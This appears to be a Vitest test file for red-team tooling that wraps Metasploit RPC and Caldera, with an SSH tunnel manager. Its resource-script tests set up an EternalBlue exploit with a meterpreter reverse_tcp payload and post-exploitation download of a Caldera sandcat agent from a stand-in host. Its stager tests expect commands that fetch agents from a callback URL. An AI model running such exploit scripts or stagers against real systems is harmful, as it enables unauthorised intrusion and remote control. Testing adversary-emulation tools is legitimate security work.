import { describe, it, expect, vi, beforeEach } from "vitest";

// ─── SSH Tunnel Manager Tests ─────────────────────────────────────────────

describe("SSH Tunnel Manager", () => {
  describe("Module exports", () => {
    it("exports tunnelManager singleton", async () => {
      const mod = await import("./lib/ssh-tunnel-manager");
      expect(mod.tunnelManager).toBeDefined();
      expect(typeof mod.tunnelManager.createTunnel).toBe("function");
      expect(typeof mod.tunnelManager.closeTunnel).toBe("function");
      expect(typeof mod.tunnelManager.getTunnelStatus).toBe("function");
      expect(typeof mod.tunnelManager.getAllTunnelStatuses).toBe("function");
      expect(typeof mod.tunnelManager.getLocalPort).toBe("function");
      expect(typeof mod.tunnelManager.isConnected).toBe("function");
      expect(typeof mod.tunnelManager.healthCheck).toBe("function");
      expect(typeof mod.tunnelManager.healthCheckAll).toBe("function");
      expect(typeof mod.tunnelManager.closeAll).toBe("function");
    });

    it("exports createTunnelForServer helper", async () => {
      const mod = await import("./lib/ssh-tunnel-manager");
      expect(typeof mod.createTunnelForServer).toBe("function");
    });

    it("exports hasDefaultSshKey helper", async () => {
      const mod = await import("./lib/ssh-tunnel-manager");
      expect(typeof mod.hasDefaultSshKey).toBe("function");
      expect(typeof mod.hasDefaultSshKey()).toBe("boolean");
    });

    it("exports getDefaultSshPublicKey helper", async () => {
      const mod = await import("./lib/ssh-tunnel-manager");
      expect(typeof mod.getDefaultSshPublicKey).toBe("function");
    });

    it("exports DEFAULT_SSH_KEY_PATH constant", async () => {
      const mod = await import("./lib/ssh-tunnel-manager");
      expect(mod.DEFAULT_SSH_KEY_PATH).toBeDefined();
      expect(typeof mod.DEFAULT_SSH_KEY_PATH).toBe("string");
      expect(mod.DEFAULT_SSH_KEY_PATH).toContain("msf_deploy_key");
    });
  });

  describe("TunnelManager state management", () => {
    it("returns null for non-existent tunnel status", async () => {
      const { tunnelManager } = await import("./lib/ssh-tunnel-manager");
      const status = tunnelManager.getTunnelStatus("non-existent-tunnel");
      expect(status).toBeNull();
    });

    it("returns null for non-existent tunnel local port", async () => {
      const { tunnelManager } = await import("./lib/ssh-tunnel-manager");
      const port = tunnelManager.getLocalPort("non-existent-tunnel");
      expect(port).toBeNull();
    });

    it("returns false for non-existent tunnel connection check", async () => {
      const { tunnelManager } = await import("./lib/ssh-tunnel-manager");
      expect(tunnelManager.isConnected("non-existent-tunnel")).toBe(false);
    });

    it("returns empty array for getAllTunnelStatuses when no tunnels", async () => {
      const { tunnelManager } = await import("./lib/ssh-tunnel-manager");
      const statuses = tunnelManager.getAllTunnelStatuses();
      expect(Array.isArray(statuses)).toBe(true);
    });

    it("returns unhealthy for non-existent tunnel health check", async () => {
      const { tunnelManager } = await import("./lib/ssh-tunnel-manager");
      const result = await tunnelManager.healthCheck("non-existent-tunnel");
      expect(result.healthy).toBe(false);
      expect(result.error).toBe("Tunnel not found");
    });

    it("healthCheckAll returns empty object when no tunnels", async () => {
      const { tunnelManager } = await import("./lib/ssh-tunnel-manager");
      const results = await tunnelManager.healthCheckAll();
      expect(typeof results).toBe("object");
    });
  });

  describe("createTunnelForServer validation", () => {
    it("throws when server has no IP address", async () => {
      const { createTunnelForServer } = await import("./lib/ssh-tunnel-manager");
      await expect(
        createTunnelForServer({ id: 999, ipAddress: null })
      ).rejects.toThrow("Server has no IP address");
    });
  });
});

// ─── MsfClient Tests ──────────────────────────────────────────────────────

describe("MsfClient", () => {
  describe("Module exports", () => {
    it("exports MsfClient class", async () => {
      const mod = await import("./lib/msf-client");
      expect(mod.MsfClient).toBeDefined();
      expect(typeof mod.MsfClient).toBe("function");
    });

    it("exports generateAgentStagers function", async () => {
      const mod = await import("./lib/msf-client");
      expect(typeof mod.generateAgentStagers).toBe("function");
    });

    it("exports generateMsfResourceScript function", async () => {
      const mod = await import("./lib/msf-client");
      expect(typeof mod.generateMsfResourceScript).toBe("function");
    });
  });

  describe("MsfClient construction", () => {
    it("creates client with basic config", async () => {
      const { MsfClient } = await import("./lib/msf-client");
      const client = new MsfClient({
        host: "127.0.0.1",
        port: 55553,
        user: "msf",
        pass: "test123",
        ssl: false,
      });
      expect(client).toBeDefined();
      expect(client.currentToken).toBeNull();
    });

    it("creates client with pre-set token", async () => {
      const { MsfClient } = await import("./lib/msf-client");
      const client = new MsfClient({
        host: "127.0.0.1",
        port: 55553,
        user: "msf",
        pass: "test123",
        ssl: false,
        token: "existing-token-123",
      });
      expect(client.currentToken).toBe("existing-token-123");
    });

    it("fromServerConfig returns null when no IP", async () => {
      const { MsfClient } = await import("./lib/msf-client");
      const result = MsfClient.fromServerConfig({
        ipAddress: null,
        rpcPort: 55553,
        rpcUser: "msf",
        rpcPass: "test",
        rpcSsl: false,
        rpcToken: null,
      });
      expect(result).toBeNull();
    });

    it("fromServerConfig creates client with valid config", async () => {
      const { MsfClient } = await import("./lib/msf-client");
      const result = MsfClient.fromServerConfig({
        ipAddress: "10.0.0.1",
        rpcPort: 55553,
        rpcUser: "msf",
        rpcPass: "test",
        rpcSsl: false,
        rpcToken: null,
      });
      expect(result).not.toBeNull();
      expect(result).toBeInstanceOf(MsfClient);
    });

    it("fromServerWithTunnel returns null when no IP", async () => {
      const { MsfClient } = await import("./lib/msf-client");
      const result = await MsfClient.fromServerWithTunnel({
        id: 1,
        ipAddress: null,
        rpcPort: 55553,
        rpcUser: "msf",
        rpcPass: "test",
        rpcSsl: false,
        rpcToken: null,
      });
      expect(result).toBeNull();
    });
  });

  describe("Agent stager generation", () => {
    it("generates stagers for all platforms", async () => {
      const { generateAgentStagers } = await import("./lib/msf-client");
      const stagers = generateAgentStagers("http://caldera.example.com:8888");
      expect(stagers.length).toBeGreaterThan(0);

      const platforms = stagers.map((s) => s.platform);
      expect(platforms).toContain("windows");
      expect(platforms).toContain("linux");
      expect(platforms).toContain("darwin");
    });

    it("includes callback URL in all stagers", async () => {
      const { generateAgentStagers } = await import("./lib/msf-client");
      const url = "http://caldera.test:8888";
      const stagers = generateAgentStagers(url);
      stagers.forEach((s) => {
        expect(s.callbackUrl).toBe(url);
        expect(s.command).toContain(url);
      });
    });

    it("uses custom group name", async () => {
      const { generateAgentStagers } = await import("./lib/msf-client");
      const stagers = generateAgentStagers("http://caldera.test:8888", "blue");
      stagers.forEach((s) => {
        expect(s.command).toContain("blue");
      });
    });
  });

  describe("Resource script generation", () => {
    it("generates valid resource script", async () => {
      const { generateMsfResourceScript } = await import("./lib/msf-client");
      const script = generateMsfResourceScript({
        exploitModule: "exploit/windows/smb/ms17_010_eternalblue",
        targetIp: "192.168.1.100",
        targetPort: 445,
        payloadModule: "windows/x64/meterpreter/reverse_tcp",
        calderaUrl: "http://caldera.test:8888",
        lhost: "10.0.0.1",
        lport: 4444,
      });

      expect(script).toContain("use exploit/windows/smb/ms17_010_eternalblue");
      expect(script).toContain("set RHOSTS 192.168.1.100");
      expect(script).toContain("set RPORT 445");
      expect(script).toContain("set PAYLOAD windows/x64/meterpreter/reverse_tcp");
      expect(script).toContain("set LHOST 10.0.0.1");
      expect(script).toContain("set LPORT 4444");
      expect(script).toContain("exploit -j");
    });

    it("includes Caldera agent deployment in post-exploitation", async () => {
      const { generateMsfResourceScript } = await import("./lib/msf-client");
      const script = generateMsfResourceScript({
        exploitModule: "exploit/multi/handler",
        targetIp: "192.168.1.100",
        calderaUrl: "http://caldera.test:8888",
        lhost: "10.0.0.1",
      });

      expect(script).toContain("sandcat.go");
      expect(script).toContain("caldera.test");
    });
  });
});

// ─── MessagePack Protocol Tests ───────────────────────────────────────────

describe("MessagePack Protocol", () => {
  it("msgpackr is available and functional", async () => {
    const { Packr, Unpackr } = await import("msgpackr");
    const packr = new Packr({ useRecords: false });
    const unpackr = new Unpackr({ useRecords: false });

    const data = ["auth.login", "msf", "password123"];
    const packed = packr.pack(data);
    expect(Buffer.isBuffer(packed)).toBe(true);

    const unpacked = unpackr.unpack(packed);
    expect(unpacked).toEqual(data);
  });

  it("handles nested objects in msgpack", async () => {
    const { Packr, Unpackr } = await import("msgpackr");
    const packr = new Packr({ useRecords: false });
    const unpackr = new Unpackr({ useRecords: false });

    const data = {
      result: "success",
      token: "abc123",
      nested: { version: "6.4.116", api: "1.0" },
    };
    const packed = packr.pack(data);
    const unpacked = unpackr.unpack(packed);
    expect(unpacked).toEqual(data);
  });
});
